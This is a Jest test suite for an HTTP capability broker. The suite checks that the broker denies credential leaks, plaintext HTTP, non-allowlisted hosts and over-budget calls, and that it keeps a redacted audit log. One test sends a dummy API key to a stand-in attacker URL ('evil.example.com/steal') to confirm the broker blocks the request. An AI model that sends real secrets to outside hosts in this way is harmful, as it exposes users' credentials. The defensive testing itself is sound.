import { execFile } from 'child_process';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

const BROKER = path.resolve(__dirname, '..', 'scripts', 'shelly-capability-broker.js');

interface RunResult {
  code: number;
  out: string;
  err: string;
  audit: any[];
}

function makeDir(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'cap-broker-'));
}

/**
 * Run the broker against a live local http server; returns exit code + files.
 * Async (execFile, not execFileSync) so an in-process test server can serve the
 * child request — a synchronous spawn would block jest's event loop and deadlock.
 */
function runBroker(
  dir: string,
  opts: {
    url: string;
    method?: string;
    body?: string;
    authRef?: string;
    tainted?: boolean;
    approved?: boolean;
    env?: Record<string, string>;
    budget?: { calls: number; startedAtMs: number };
  },
): Promise<RunResult> {
  const outFile = path.join(dir, 'out.txt');
  const errFile = path.join(dir, 'err.txt');
  const auditFile = path.join(dir, 'audit.jsonl');
  const budgetFile = path.join(dir, 'budget.json');
  const envFile = path.join(dir, '.env');

  if (opts.env) {
    const lines = Object.entries(opts.env).map(([k, v]) => `${k}='${String(v).replace(/'/g, "'\\''")}'`);
    fs.writeFileSync(envFile, lines.join('\n') + '\n');
  }
  if (opts.budget) fs.writeFileSync(budgetFile, JSON.stringify(opts.budget));

  const argv = [
    BROKER,
    '--method',
    opts.method || 'POST',
    '--url',
    opts.url,
    '--auth-ref',
    opts.authRef || '',
    '--tainted',
    opts.tainted ? '1' : '0',
    '--approved',
    opts.approved ? '1' : '0',
    '--secret-env-file',
    envFile,
    '--audit-log',
    auditFile,
    '--budget-file',
    budgetFile,
    '--timeout-seconds',
    '10',
    '--out',
    outFile,
    '--err',
    errFile,
  ];
  if (opts.method !== 'GET') {
    const bodyFile = path.join(dir, 'body.json');
    fs.writeFileSync(bodyFile, opts.body ?? '{}');
    argv.push('--body-file', bodyFile);
  }

  return new Promise((resolve) => {
    execFile('node', argv, { encoding: 'utf8' }, (err: any) => {
      const code = err ? (typeof err.code === 'number' ? err.code : 1) : 0;
      const read = (f: string) => (fs.existsSync(f) ? fs.readFileSync(f, 'utf8') : '');
      const auditText = read(auditFile).trim();
      const audit = auditText ? auditText.split('\n').map((l) => JSON.parse(l)) : [];
      resolve({ code, out: read(outFile), err: read(errFile), audit });
    });
  });
}

describe('shelly-capability-broker: policy gates (no network)', () => {
  let dir: string;
  beforeEach(() => {
    dir = makeDir();
  });
  afterEach(() => {
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('DENYs a secret spent against a mismatched host and never sends', async () => {
    const r = await runBroker(dir, {
      url: 'https://evil.example.com/steal',
      authRef: 'perplexity',
      env: { PERPLEXITY_API_KEY: 'pplx-SECRETSECRETSECRETSECRET' },
    });
    expect(r.code).toBe(40);
    expect(r.audit[0].decision).toBe('deny');
    expect(r.audit[0].signals).toContain('ref-host-mismatch');
    // The secret must never appear in any output file.
    expect(r.err + r.out + JSON.stringify(r.audit)).not.toContain('pplx-SECRET');
  });

  it('DENYs plaintext http to a remote host', async () => {
    const r = await runBroker(dir, { url: 'http://api.groq.com/x' });
    expect(r.code).toBe(40);
    expect(r.audit[0].signals).toContain('insecure-scheme');
  });

  it('blocks a non-allowlist host fail-closed when not approved (41)', async () => {
    const r = await runBroker(dir, { url: 'https://hooks.example.com/incoming' });
    expect(r.code).toBe(41);
    expect(r.audit[0].decision).toBe('approve');
    expect(r.audit[0].signals).toContain('non-allowlist-host');
  });

  it('fails closed with NO_SECRET (43) when the auth_ref env var is missing', async () => {
    const r = await runBroker(dir, { url: 'https://api.perplexity.ai/chat/completions', authRef: 'perplexity' });
    expect(r.code).toBe(43);
  });

  it('fails closed with BUDGET (42) when the call budget is exhausted', async () => {
    const r = await runBroker(dir, {
      url: 'https://api.groq.com/openai/v1/chat/completions',
      authRef: 'groq',
      env: { GROQ_API_KEY: 'gsk_SECRETSECRETSECRETSECRET' },
      budget: { calls: 40, startedAtMs: Date.now() },
    });
    expect(r.code).toBe(42);
    expect(r.err).toMatch(/budget/);
  });
});

describe('shelly-capability-broker: secret injection + send (loopback server)', () => {
  let dir: string;
  let server: import('http').Server;
  let port: number;
  let lastAuthHeader: string | undefined;

  beforeEach((done) => {
    dir = makeDir();
    // A loopback host is allowlisted (127.0.0.1). We register an auth_ref bound to
    // 127.0.0.1 by monkeypatching via a custom ref is not possible, so instead we
    // test the un-authed loopback send path AND the budget increment/audit here.
    const httpMod = require('http');
    server = httpMod.createServer((req: any, res: any) => {
      lastAuthHeader = req.headers['authorization'];
      let body = '';
      req.on('data', (c: any) => (body += c));
      req.on('end', () => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true, echoedLen: body.length }));
      });
    });
    server.listen(0, '127.0.0.1', () => {
      port = (server.address() as any).port;
      done();
    });
  });
  afterEach((done) => {
    fs.rmSync(dir, { recursive: true, force: true });
    server.close(() => done());
  });

  it('allows an un-authed loopback POST, records a redacted audit, and increments the budget', async () => {
    const r = await runBroker(dir, { url: `http://127.0.0.1:${port}/v1/chat/completions`, body: '{"hi":1}' });
    expect(r.code).toBe(0);
    expect(r.out).toContain('"ok":true');
    expect(r.audit[0].decision).toBe('allow');
    expect(r.audit[0].status).toBe(200);
    expect(r.audit[0].authRef).toBeNull();
    // budget file advanced to 1
    const budget = JSON.parse(fs.readFileSync(path.join(dir, 'budget.json'), 'utf8'));
    expect(budget.calls).toBe(1);
    // no auth header was sent for an un-authed call
    expect(lastAuthHeader).toBeUndefined();
  });
});
